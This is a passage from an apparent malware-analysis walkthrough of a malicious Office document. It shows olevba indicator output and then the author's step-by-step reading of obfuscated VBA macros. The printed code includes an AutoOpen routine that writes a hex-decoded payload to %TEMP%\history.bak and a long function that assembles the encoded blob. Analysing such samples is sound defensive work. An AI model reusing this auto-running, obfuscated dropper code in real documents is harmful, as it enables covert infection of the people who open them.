4 Macros (XLM/XLF)| |Suspicious|CreateObject |May create an OLE object | |Suspicious|Chr |May attempt to obfuscate specific strings | | | |(use option --deobf to deobfuscate) | |Suspicious|Hex Strings |Hex-encoded strings were detected, may be | | | |used to obfuscate strings (option --decode to| | | |see all) | |Hex String|Scripti |53637269707469 | |Hex String|ng.FileSystemObject |6e672e46696c6553797374656d4f626a656374 | |Hex String|\\hist |5c68697374 | |Hex String|ory.bak |6f72792e62616b | |Hex String|74 65 66 122 65 68 |373420363520363620313232203635203638203438203| | |48 65 74 1 |6352037342031 | |Hex String|19 65 51 65 68 99 65|313920363520353120363520363820393920363520373| | |76 103 65 51 65 68 |620313033203635203531203635203638203831203635| | |81 65 76 103 |20373620313033 | |Hex String|65 120 65 68 10 |363520313230203635203638203130 | |Hex String|7 65 79 65 65 117 65|372036352037392036352036352031313720363520363| | |68 85 65 77 103 65 |820383520363520373720313033203635203534203635| | |54 65 68 103 65 77 |20363820313033203635203737203635203635203532 | | |65 65 52 | | |Hex String|65 68 65 65 74 |3635203638203635203635203734 | |Hex String| 119 65 55 65 67 81 |203131392036352035352036352036372038312036352| | |65 97 81 65 57 65 67|039372038312036352035372036352036372039392036| | |99 65 90 65 65 48 65|35203930203635203635203438203635203638203737 | | |68 77 | | |Hex String|65 89 103 66 106 65 |363520383920313033203636203130362036352037312| | |71 77 65 78 103 66 |037372036352037382031303320363620313037203635| | |107 65 6 |2036 | |Hex String|7 48 65 77 65 65 48 |372034382036352037372036352036352034382036352| | |65 68 77 65 90 |03638203737203635203930 | |Hex String|103 65 121 65 68 81 |313033203635203132312036352036382038312036352| | |65 77 65 65 5 |037372036352036352035 | |Hex String|3 65 67 48 65 78 119|332036352036372034382036352037382031313920363| | |66 108 65 71 69 65 |620313038203635203731203639203635203737203130| | |77 103 65 |33203635 | |Hex String|122 65 71 69 65 77 |313232203635203731203639203635203737203130332| | |103 66 106 65 67 99 |036362031303620363520363720393920363520373920| | |65 79 119 65 107 65 |313139203635203130372036352037322036352036352| | |72 65 65 80 81 65 1 |038302038312036352031 | |Hex String|10 65 |3130203635 | |Hex String|71 103 65 100 65 66 |373120313033203635203130302036352036362034382| | |48 65 72 65 65 79 |036352037322036352036352037392031303320 | | |103 | | |Hex String|65 118 65 67 56 65 |363520313138203635203637203536203635203734203| | |74 119 65 55 65 67 |13139203635203535203635203637203831 | | |81 | | |Hex String|65 100 103 65 57 65 |363520313030203130332036352035372036352036392| | |69 107 65 98 103 66 |031303720363520393820313033203636203530203635| | |50 65 71 56 65 97 |203731203536203635203937203131392036362031303| | |119 66 108 65 67 4 |82036352036372034 | |Hex String|8 65 85 |38203635203835 | |Hex String|103 66 108 65 72 77 |313033203636203130382036352037322037372036352| | |65 100 65 66 78 65 |031303020363520363620373820363520373120383520| | |71 85 65 100 65 66 |363520313030203635203636203131312036352037312| | |111 65 71 56 65 90 |03536203635203930 | |Hex String| 65 65 |203635203635 | |Hex String|103 65 67 48 65 86 |313033203635203637203438203635203836203831203| | |81 66 122 65 71 8 |636203132322036352037312038 | |Hex String|5 65 81 103 66 104 |352036352038312031303320363620313034203635203| | |65 72 77 65 97 81 66|732203737203635203937203831203636203130362036| | |106 65 |35 | |Hex String|70 65 65 89 81 66 |373020363520363520383920383120363620313231203| | |121 65 72 77 65 97 |635203732203737203635203937203831203636 | | |81 66 | | |Hex String| 117 65 71 99 65 73 |203131372036352037312039392036352037332036352| | |65 65 116 65 70 85 |0363520313136203635203730203835203635 | | |65 | | |Hex String|99 103 66 112 65 67 |393920313033203636203131322036352036372036352| | |65 65 74 65 66 119 |036352037342036352036362031313920363520363720| | |65 67 81 65 99 119 |3831203635203939203131392036352031313820 | | |65 118 | | |Hex String|65 71 81 65 78 65 |3635203731203831203635203738203635 | |Hex String|65 122 65 71 73 65 |363520313232203635203731203733203635 | |Hex String| 89 119 66 106 65 68|203839203131392036362031303620363520363820383| | |89 65 90 65 65 103 |920363520393020363520363520313033203635203637| | |65 67 48 65 83 65 66|20343820363520383320363520363620313038 | | |108 | | |Hex String|65 71 69 65 90 65 66|363520373120363920363520393020363520363620313| | |108 65 72 73 65 99 |038203635203732203733203635203939203131392036| | |119 65 |35 | |Hex String| 103 65 69 65 65 101|203130332036352036392036352036352031303120313| | |119 65 105 65 69 |13920363520313035203635203639 | |Hex String|69 65 100 81 66 48 |363920363520313030203831203636203438203635203| | |65 71 103 65 9 |731203130332036352039 | |Hex String|8 119 66 121 65 71 |382031313920363620313231203635203731203130372| | |107 65 101 103 66 |036352031303120313033203636203130342036352037| | |104 65 72 81 |32203831 | |Hex String|65 97 81 66 |363520393720383120363620 | |Hex String|118 65 71 52 65 73 |313138203635203731203532203635203733203130332| | |103 65 57 65 67 81 |036352035372036352036372038312036352039372038| | |65 97 81 66 57 65 68|312036362035372036352036382031313520363520313| | |115 65 100 |030 | |Hex String|119 66 111 65 71 107|313139203636203131312036352037312031303720363| | |65 98 65 66 108 |520393820363520363620313038 | |Hex String| 65 67 65 65 75 65 |203635203637203635203635203735203635203635203| | |65 107 65 72 81 65 |130372036352037322038312036352039392031303320| | |99 103 66 |3636 | |Hex String|49 65 71 85 65 75 81|343920363520373120383520363520373520383120363| | |66 55 65 67 81 65 89|620353520363520363720383120363520383920313139| | |119 65 57 65 67 103 |203635203537203635203637203130332036352038332| | |65 83 81 66 11 |03831203636203131 | |Hex String|7 65 72 |37203635203732 | |Hex String|89 65 98 119 66 114 |383920363520393820313139203636203131342036352| | |65 71 85 65 76 81 66|03731203835203635203736203831203636203833 | | |83 | | |Hex String| 65 71 85 65 99 119 |203635203731203835203635203939203131392036362| | |66 48 65 69 48 65 90|03438203635203639203438203635203930 | |Hex String|81 66 48 65 71 103 |383120363620343820363520373120313033203635203| | |65 98 119 66 107 65 |938203131392036362031303720363520363720363520| | |67 65 65 76 81 66 86|36352037362038312036362038362036352037322037 | | |65 72 7 | | |Hex String|7 65 90 81 66 67 |37203635203930203831203636203637 | |Hex String|65 71 69 65 99 119 |363520373120363920363520393920313139203636203| | |66 112 65 71 77 65 |131322036352037312037372036352038352036352036| | |85 65 66 104 65 |362031303420363520 | |Hex String|72 73 65 99 119 66 |373220373320363520393920313139203636203131322| | |112 65 71 |03635203731 | |Hex String|52 65 90 119 65 103 |353220363520393020313139203635203130332036352| | |65 67 48 65 86 81 66|036372034382036352038362038312036362031323120| | |121 65 71 107 65 73 |363520373120313037203635203733203635203635203| | |65 65 107 65 72 65 |13037203635203732203635 | |Hex String|74 65 66 122 65 67 |37342036352036362031323220363520363720 | |Hex String|56 65 77 65 65 48 65|353620363520373720363520363520343820363520363| | |68 77 65 90 103 65 |820373720363520393020313033203635203132312036| | |121 65 68 81 65 77 |35203638203831203635203737203635203635 | | |65 65 | | |Hex String|53 65 67 65 65 76 81|353320363520363720363520363520373620383120363| | |66 73 65 71 85 65 89|620373320363520373120383520363520383920383120| | |81 66 107 65 |363620313037203635 | |Hex String| 71 85 65 99 103 66 |203731203835203635203939203130332036362031323| | |122 65 67 |2203635203637 | |Hex String|65 65 81 65 66 55 65|363520363520383120363520363620353520363520363| | |67 73 65 8 |72037332036352038 | |Hex String|1 81 66 49 65 72 81 |312038312036362034392036352037322038312036352| | |65 97 65 66 118 65 |039372036352036362031313820363520373220373320| | |72 73 65 97 |3635203937 | |Hex String|81 66 54 65 71 69 65|383120363620353420363520373120363920363520 | |Hex String|100 65 66 112 65 71 |313030203635203636203131322036352037312035362| | |56 65 98 103 65 105 |036352039382031303320363520313035203635203638| | |65 68 48 65 74 65 66|203438203635203734203635203636 | |Hex String|112 65 72 48 65 |31313220363520373220343820363520 | |Hex String|75 81 65 55 65 71 |373520383120363520353520363520373120313037203| | |107 65 90 103 65 103|635203930203130332036352031303320363520363720| | |65 67 103 65 74 65 |31303320363520373420363520363620313036203635 | | |66 106 65 | | |Hex String| 65 65 76 81 66 117 |203635203635203736203831203636203131372036352| | |65 71 85 65 73 65 65|037312038352036352037332036352036352031313020| | |110 65 69 52 65 98 |363520363920353220363520393820313139203636203| | |119 66 117 65 71 85 |13137203635203731203835 | |Hex String|65 74 119 65 112 65 |363520373420313139203635203131322036352036372| | |67 65 65 101 119 65 |036352036352031303120313139203635203130372036| | |107 65 72 73 65 80 |352037322037332036352038302038312036362031313| | |81 66 112 65 |220363520 | |Hex String|71 85 65 101 |373120383520363520313031 | |Hex String|65 65 103 |36352036352031303320 | |Hex String|65 67 81 65 89 119 |363520363720383120363520383920313139203635203| | |65 103 65 67 48 65 |130332036352036372034382036352038322038312036| | |82 81 66 121 65 72 |362031323120363520373220373320363520393820313| | |73 65 98 119 66 |139203636 | |Hex String|121 65 69 69 65 89 |313231203635203639203639203635203839203131392| | |119 66 48 65 71 107 |036362034382036352037312031303720363520393820| | |65 98 119 66 117 65 |3131392036362031313720363520 | |Hex String|67 65 65 85 119 66 |363720363520363520383520313139203636203438203| | |48 65 |635 | |Hex String|71 56 65 99 65 65 |373120353620363520393920363520363520313033203| | |103 65 67 48 65 82 |635203637203438203635203832203831203636203132| | |81 66 121 |3120 | |Hex String|65 72 73 65 98 119 |363520373220373320363520393820313139203636203| | |66 121 65 70 89 |13231203635203730203839 | |Hex String|65 89 81 66 121 65 |363520383920383120363620313231203635203731203| | |71 107 65 89 8 |130372036352038392038 | |Hex String|1 66 105 65 71 119 |312036362031303520363520373120313139203635203| | |65 90 81 65 103 65 |930203831203635203130332036352037312038352036| | |71 85 65 79 |35203739 | |Hex String|119 65 107 65 72 73 |313139203635203130372036352037322037332036352| | |65 80 81 |0383020383120 | |Hex String|66 80 65 72 85 65 |363620383020363520373220383520363520313030203| | |100 65 65 116 65 70 |635203635203131362036352037302037372036352031| | |77 65 100 65 66 |3030203635203636 | |Hex String|121 65 7 |3132312036352037 | |Hex String|1 107 65 98 103 66 |312031303720363520393820313033203636203131302| | |110 65 67 65 65 76 |036352036372036352036352037362038312036362037| | |81 66 74 65 71 52 65|342036352037312035322036352039392036352036362| | |99 65 66 49 65 |03439203635 | |Hex String|72 81 65 84 119 66 |373220383120363520383420313139203636203130352| | |105 65 71 111 65 90 |036352037312031313120363520393020383120363620| | |81 66 106 65 72 81 |313036203635203732203831203635203733203635203| | |65 73 65 65 107 65 |63520313037203635203732 | | |72 | | |Hex String|65 79 119 65 107 65 |363520373920313139203635203130372036352037322| | |72 81 65 80 81 66 |0383120363520383020383120363620 | |Hex String|74 65 71 52 65 100 |373420363520373120353220363520313030203130332| | |103 66 118 65 71 115|036362031313820363520373120313135203635203930| | |65 90 | | |Hex String|81 65 116 65 70 73 |383120363520313136203635203730203733203635203| | |65 90 81 66 122 65 |930203831203636203132322036352037322038312036| | |72 81 65 84 81 66 10|35203834203831203636203130 | |Hex String|8 65 72 81 65 97 65 |382036352037322038312036352039372036352036362| | |66 118 |0313138 | |Hex String|65 71 81 65 73 |3635203731203831203635203733 | |Hex String| 65 65 116 65 70 85 |203635203635203131362036352037302038352036352| | |65 99 103 66 112 65 |039392031303320363620313132203635203637203635| | |67 65 65 74 65 66 |20363520373420363520363620313139203635203637 | | |119 65 67 | | |Hex String|81 65 99 119 65 118 |383120363520393920313139203635203131382036352| | |65 68 99 65 90 81 66|036382039392036352039302038312036362031303420| | |104 65 68 73 65 77 |363520363820373320363520373720313139203636203| | |119 66 104 65 68 73 |1303420363520363820373320 | |Hex String|89 119 65 103 65 67 |383920313139203635203130332036352036372034382| | |48 65 84 81 66 108 |036352038342038312036362031303820363520373220| | |65 72 81 65 97 65 66|383120363520393720363520363620313138203635203| | |118 65 71 |73120 | |Hex String|81 65 73 65 |3831203635203733203635 | |Hex String|66 81 |363620383120 | |Hex String|65 69 56 65 85 119 |363520363920353620363520383520313139203636203| | |66 85 65 67 65 65 76|835203635203637203635203635203736203831203636| | |81 66 73 65 71 85 65|203733203635203731203835203635203839203831203| | |89 81 66 107 65 |63620313037203635 | |Hex String|71 85 65 99 103 66 |373120383520363520393920313033203636203132322| | |122 65 67 65 65 81 |036352036372036352036352038312036352036362035| | |65 66 55 |35 | |Hex String| 65 67 73 65 81 81 |203635203637203733203635203831203831203636203| | |66 49 65 72 81 65 |439203635203732203831203635 | |Hex String|97 65 66 118 65 72 |393720363520363620313138203635203732203733203| | |73 65 97 81 66 54 65|635203937203831203636203534203635203731203639| | |71 69 65 100 65 66 |203635203130302036352036362031313220363520373| | |112 65 71 56 65 98 |1203536203635203938 | |Hex String| 103 |20313033 | |Hex String|65 105 65 68 48 65 |363520313035203635203638203438203635203734203| | |74 65 66 112 65 72 |635203636203131322036352037322034382036352037| | |48 65 73 65 65 |3320363520363520 | |Hex String|116 65 69 73 65 98 |313136203635203639203733203635203938203131392| | |119 66 107 |0363620313037 | |Hex String|65 72 |363520373220 | |Hex String|107 65 73 65 65 111 |313037203635203733203635203635203131312036352| | |65 70 115 65 85 119 |037302031313520363520383520313139203636203533| | |66 53 65 72 77 65 |203635203732203737203635203130302036352036362| | |100 65 66 108 65 71 |0313038203635203731 | |Hex String|48 65 |3438203635 | |Hex String| 76 103 66 85 65 71 |203736203130332036362038352036352037312038352| | |85 65 101 65 66 48 |036352031303120363520363620343820363520363720| | |65 67 52 65 82 81 66|353220363520383220383120363620313137203635203| | |117 65 71 77 65 98 |731203737203635203938 | |Hex String|119 66 107 65 71 107|313139203636203130372036352037312031303720363| | |65 98 103 66 110 65 |520393820313033203636203131302036352037302034| | |70 48 65 79 103 65 |382036352037392031303320363520353420363520373| | |54 65 70 85 65 |0203835203635 | |Hex String| 86 65 66 |203836203635203636 | |Hex String|71 65 68 103 65 76 |373120363520363820313033203635203736203130332| | |103 66 72 65 71 |03636203732203635203731 | |Hex String| 85 65 100 65 66 67 |203835203635203130302036352036362036372036352| | |65 72 107 65 100 65 |037322031303720363520313030203635203636203130| | |66 108 65 |38203635 | |Hex String|72 77 65 75 65 65 |373220373720363520373520363520363520313037203| | |107 65 71 85 65 75 |635203731203835203635203735203131392036352031| | |119 65 107 65 72 73 |303720363520373220373320363520373520383120363| | |65 75 81 65 |5 | |Hex String| 103 65 67 48 |20313033203635203637203438 | |Hex String|65 97 103 66 |36352039372031303320363620 | |Hex String|118 65 71 107 65 98 |313138203635203731203130372036352039382031303| | |103 65 103 65 67 99 |320363520313033203635203637203939203635203733| | |65 73 65 65 110 65 |203635203635203131302036352036372031303720363| | |67 107 65 |5 | |Hex String| 81 65 103 65 72 77 |203831203635203130332036352037322037372036352| | |65 98 65 66 108 65 |039382036352036362031303820363520373120383520| | |71 85 65 99 65 65 |363520393920363520363520313033203635203638203| | |103 65 68 65 65 76 |63520363520373620313033 | | |103 | | |Hex String|65 52 65 72 48 65 83|363520353220363520373220343820363520383320363| | |65 66 |520363620 | |Hex String|85 65 69 73 65 101 |383520363520363920373320363520313031203131392| | |119 65 49 65 72 85 |036352034392036352037322038352036352039392036| | |65 99 65 65 122 65 |3520363520313232203635 | |Hex String|72 73 65 88 119 65 |373220373320363520383820313139203635203132322| | |122 65 68 81 65 78 8|036352036382038312036352037382038 | |Hex String|1 66 53 65 70 56 65 |312036362035332036352037302035362036352039382| | |98 81 65 48 65 71 77|03831203635203438203635203731203737203635 | | |65 | | |Hex String|99 103 65 119 65 68 |393920313033203635203131392036352036382038352| | |85 65 102 81 |036352031303220383120 | |Hex String|65 61 |3635203631 | |Hex String|Scripting.FileSyst |536372697074696e672e46696c6553797374 | |Hex String|emObject |656d4f626a656374 | |Hex String|istory.bak |6973746f72792e62616b | +----------+--------------------+---------------------------------------------+  VBA script deobfuscation We are interested in the above VBA scripts. Let\u0026rsquo;s start with the shortest one:\nFunctionuxdufnkjlialsyp(ByVal tiyrahvbz As String) As String Dimnqjveawetp AsLong Fornqjveawetp =1ToLen(tiyrahvbz) Step 2 uxdufnkjlialsyp =uxdufnkjlialsyp \u0026amp;Chr$(Val(\"\u0026amp;H\"\u0026amp;Mid$(tiyrahvbz, nqjveawetp, 2))) Nextnqjveawetp End Function  It seems to be doing some kind of transformation to the variable tiyrahvbz passed as argument.\nThen we have a large VBA script. I\u0026rsquo;ll break it down into smaller pieces. These are the first functions:\nSubAutoOpen() odhsjwpphlxnb Call lmavedb End Sub Private Sub odhsjwpphlxnb() Dimbnhupraoau AsString CreateObject(\"WScript.Shell\").currentdirectory =Environ(\"TEMP\") bnhupraoau =sryivxjsdncj() dropPath =Environ(\"TEMP\") Set rxnnvnfqufrzqfhnff =CreateObject(uxdufnkjlialsyp(\"53637269707469\") \u0026amp;uxdufnkjlialsyp(\"6e672e46696c6553797374656d4f626a656374\")) Set dfdjqgaqhvxxi =rxnnvnfqufrzqfhnff.CreateTextFile(dropPath \u0026amp;uxdufnkjlialsyp(\"5c68697374\") \u0026amp;uxdufnkjlialsyp(\"6f72792e62616b\"),True) dfdjqgaqhvxxi.Writebnhupraoau dfdjqgaqhvxxi.Close End Sub  The function named AutoOpen is executed first, and it calls odhsjwpphlxnb and lmavedb. The former calls sryivxjsdncj:\nPrivateFunction sryivxjsdncj() AsString Dimfxnrfzsdxmcvranp AsString fxnrfzsdxmcvranp =\"\" fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +okbzichkqtto() sryivxjsdncj =fxnrfzsdxmcvranp End Function  And there\u0026rsquo;s another call to okbzichkqtto, which is a huge function:\nPrivateFunction okbzichkqtto() AsString Dimfxnrfzsdxmcvranp AsString fxnrfzsdxmcvranp =\"\" fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"3734203635203636203132322036352036382034382036352037342031\") \u0026amp;uxdufnkjlialsyp(\"31392036352035312036352036382039392036352037362031303320363520353120363520363820383120363520373620313033\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"363520313230203635203638203130\") \u0026amp;uxdufnkjlialsyp(\"37203635203739203635203635203131372036352036382038352036352037372031303320363520353420363520363820313033203635203737203635203635203532\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"3635203638203635203635203734\") \u0026amp;uxdufnkjlialsyp(\"20313139203635203535203635203637203831203635203937203831203635203537203635203637203939203635203930203635203635203438203635203638203737\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"3635203839203130332036362031303620363520373120373720363520373820313033203636203130372036352036\") \u0026amp;uxdufnkjlialsyp(\"37203438203635203737203635203635203438203635203638203737203635203930\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"313033203635203132312036352036382038312036352037372036352036352035\") \u0026amp;uxdufnkjlialsyp(\"33203635203637203438203635203738203131392036362031303820363520373120363920363520373720313033203635\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"313232203635203731203639203635203737203130332036362031303620363520363720393920363520373920313139203635203130372036352037322036352036352038302038312036352031\") \u0026amp;uxdufnkjlialsyp(\"3130203635\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"373120313033203635203130302036352036362034382036352037322036352036352037392031303320\") \u0026amp;uxdufnkjlialsyp(\"36352031313820363520363720353620363520373420313139203635203535203635203637203831\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"36352031303020313033203635203537203635203639203130372036352039382031303320363620353020363520373120353620363520393720313139203636203130382036352036372034\") \u0026amp;uxdufnkjlialsyp(\"38203635203835\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"31303320363620313038203635203732203737203635203130302036352036362037382036352037312038352036352031303020363520363620313131203635203731203536203635203930\") \u0026amp;uxdufnkjlialsyp(\"203635203635\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"313033203635203637203438203635203836203831203636203132322036352037312038\") \u0026amp;uxdufnkjlialsyp(\"35203635203831203130332036362031303420363520373220373720363520393720383120363620313036203635\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"373020363520363520383920383120363620313231203635203732203737203635203937203831203636\") \u0026amp;uxdufnkjlialsyp(\"2031313720363520373120393920363520373320363520363520313136203635203730203835203635\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"3939203130332036362031313220363520363720363520363520373420363520363620313139203635203637203831203635203939203131392036352031313820\") \u0026amp;uxdufnkjlialsyp(\"3635203731203831203635203738203635\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"363520313232203635203731203733203635\") \u0026amp;uxdufnkjlialsyp(\"20383920313139203636203130362036352036382038392036352039302036352036352031303320363520363720343820363520383320363520363620313038\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"36352037312036392036352039302036352036362031303820363520373220373320363520393920313139203635\") \u0026amp;uxdufnkjlialsyp(\"20313033203635203639203635203635203130312031313920363520313035203635203639\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"363920363520313030203831203636203438203635203731203130332036352039\") \u0026amp;uxdufnkjlialsyp(\"38203131392036362031323120363520373120313037203635203130312031303320363620313034203635203732203831\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"363520393720383120363620\") \u0026amp;uxdufnkjlialsyp(\"313138203635203731203532203635203733203130332036352035372036352036372038312036352039372038312036362035372036352036382031313520363520313030\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"313139203636203131312036352037312031303720363520393820363520363620313038\") \u0026amp;uxdufnkjlialsyp(\"2036352036372036352036352037352036352036352031303720363520373220383120363520393920313033203636\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"34392036352037312038352036352037352038312036362035352036352036372038312036352038392031313920363520353720363520363720313033203635203833203831203636203131\") \u0026amp;uxdufnkjlialsyp(\"37203635203732\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"38392036352039382031313920363620313134203635203731203835203635203736203831203636203833\") \u0026amp;uxdufnkjlialsyp(\"20363520373120383520363520393920313139203636203438203635203639203438203635203930\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"38312036362034382036352037312031303320363520393820313139203636203130372036352036372036352036352037362038312036362038362036352037322037\") \u0026amp;uxdufnkjlialsyp(\"37203635203930203831203636203637\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"363520373120363920363520393920313139203636203131322036352037312037372036352038352036352036362031303420363520\") \u0026amp;uxdufnkjlialsyp(\"37322037332036352039392031313920363620313132203635203731\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"35322036352039302031313920363520313033203635203637203438203635203836203831203636203132312036352037312031303720363520373320363520363520313037203635203732203635\") \u0026amp;uxdufnkjlialsyp(\"203635\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"37342036352036362031323220363520363720\") \u0026amp;uxdufnkjlialsyp(\"35362036352037372036352036352034382036352036382037372036352039302031303320363520313231203635203638203831203635203737203635203635\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"353320363520363720363520363520373620383120363620373320363520373120383520363520383920383120363620313037203635\") \u0026amp;uxdufnkjlialsyp(\"2037312038352036352039392031303320363620313232203635203637\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"36352036352038312036352036362035352036352036372037332036352038\") \u0026amp;uxdufnkjlialsyp(\"3120383120363620343920363520373220383120363520393720363520363620313138203635203732203733203635203937\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"383120363620353420363520373120363920363520\") \u0026amp;uxdufnkjlialsyp(\"313030203635203636203131322036352037312035362036352039382031303320363520313035203635203638203438203635203734203635203636\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"31313220363520373220343820363520\") \u0026amp;uxdufnkjlialsyp(\"37352038312036352035352036352037312031303720363520393020313033203635203130332036352036372031303320363520373420363520363620313036203635\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"3637\") \u0026amp;uxdufnkjlialsyp(\"20363520363520373620383120363620313137203635203731203835203635203733203635203635203131302036352036392035322036352039382031313920363620313137203635203731203835\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"363520373420313139203635203131322036352036372036352036352031303120313139203635203130372036352037322037332036352038302038312036362031313220363520\") \u0026amp;uxdufnkjlialsyp(\"373120383520363520313031\"))  fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"36352036352031303320\") \u0026amp;uxdufnkjlialsyp(\"363520363720383120363520383920313139203635203130332036352036372034382036352038322038312036362031323120363520373220373320363520393820313139203636\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"3132312036352036392036392036352038392031313920363620343820363520373120313037203635203938203131392036362031313720363520\") \u0026amp;uxdufnkjlialsyp(\"363720363520363520383520313139203636203438203635\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"3731203536203635203939203635203635203130332036352036372034382036352038322038312036362031323120\") \u0026amp;uxdufnkjlialsyp(\"36352037322037332036352039382031313920363620313231203635203730203839\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"363520383920383120363620313231203635203731203130372036352038392038\") \u0026amp;uxdufnkjlialsyp(\"31203636203130352036352037312031313920363520393020383120363520313033203635203731203835203635203739\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"3131392036352031303720363520373220373320363520383020383120\") \u0026amp;uxdufnkjlialsyp(\"3636203830203635203732203835203635203130302036352036352031313620363520373020373720363520313030203635203636\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"3132312036352037\") \u0026amp;uxdufnkjlialsyp(\"31203130372036352039382031303320363620313130203635203637203635203635203736203831203636203734203635203731203532203635203939203635203636203439203635\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"37322038312036352038342031313920363620313035203635203731203131312036352039302038312036362031303620363520373220383120363520373320363520363520313037203635203732\") \u0026amp;uxdufnkjlialsyp(\"203733\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"3635203739203131392036352031303720363520373220383120363520383020383120363620\") \u0026amp;uxdufnkjlialsyp(\"373420363520373120353220363520313030203130332036362031313820363520373120313135203635203930\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"38312036352031313620363520373020373320363520393020383120363620313232203635203732203831203635203834203831203636203130\") \u0026amp;uxdufnkjlialsyp(\"3820363520373220383120363520393720363520363620313138\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"3635203731203831203635203733\") \u0026amp;uxdufnkjlialsyp(\"20363520363520313136203635203730203835203635203939203130332036362031313220363520363720363520363520373420363520363620313139203635203637\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"3831203635203939203131392036352031313820363520363820393920363520393020383120363620313034203635203638203733203635203737203131392036362031303420363520363820373320\") \u0026amp;uxdufnkjlialsyp(\"3635\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"38392031313920363520313033203635203637203438203635203834203831203636203130382036352037322038312036352039372036352036362031313820363520373120\") \u0026amp;uxdufnkjlialsyp(\"3831203635203733203635\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"363620383120\") \u0026amp;uxdufnkjlialsyp(\"36352036392035362036352038352031313920363620383520363520363720363520363520373620383120363620373320363520373120383520363520383920383120363620313037203635\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"37312038352036352039392031303320363620313232203635203637203635203635203831203635203636203535\") \u0026amp;uxdufnkjlialsyp(\"203635203637203733203635203831203831203636203439203635203732203831203635\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"3937203635203636203131382036352037322037332036352039372038312036362035342036352037312036392036352031303020363520363620313132203635203731203536203635203938\") \u0026amp;uxdufnkjlialsyp(\"20313033\")) fxnrfzsdxmcvranp =fxnrfzsdxmcvranp +wdysllqkgsbzs(uxdufnkjlialsyp(\"3635203130352036352036382034382036352037342036352036362031313220363520373220343820363520373320363520363520\") 